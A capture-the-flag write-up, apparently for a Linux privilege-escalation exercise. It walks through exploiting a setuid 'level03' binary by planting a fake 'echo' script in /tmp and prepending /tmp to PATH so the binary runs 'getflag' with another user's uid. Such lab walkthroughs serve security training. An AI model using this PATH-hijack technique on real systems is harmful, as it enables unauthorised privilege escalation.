# Level03 : find flag03

## Tutorial 

1. Launching the `level03` binary : it says `Exploit me`
2. Checking the permissions for `level03` binary, `ls -l level03` :  
   - result : `-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03`
   - we can see here the `setuid` and `setgid` are set ! This means that when we execute `level03`, we execute it with the `uid` of `flag03` and the `gid` of `level03`.
3. Checking available folders where we can write and execute scripts with `ls -l /` :
   - result : `d-wx-wx-wx  4 root root  100 Apr 10 08:09 tmp`
   - we can write and execute programs in the `/tmp` folder
4. Writing program in `/tmp/echo`, `cat /tmp/echo` :
   - result : `getflag`
   - permissions (`ls -l /tmp/echo`): `----r-x--- 1 level03 level03 8 Apr 10 08:10 /tmp/echo`
   - these are the minimum permissions for `/tmp/echo` because we are executing `~/level03` with the `gid` of `level03` so it needs to be able to `r` and `x`, then `getflag` is executed with the `uid` of `flag03`
5. Executing `PATH=/tmp:$PATH ~/level03` by passing `/tmp` as file containing binaries
6. get flag for level03 !

## Additional notes and resources 

- Permissions (suid, sgid, sticky bit)
  - https://www.tecmint.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux/
  - https://linux.goffinet.org/administration/securite-locale/permissions-linux/
  - https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits
- Alias don't execute in scripts by default, need to set the shell as interactive :
  - possible other solution, doesn't work here (check link) : `alias echo=getflag`
  - https://stackoverflow.com/questions/30130954/alias-doesnt-work-inside-a-bash-script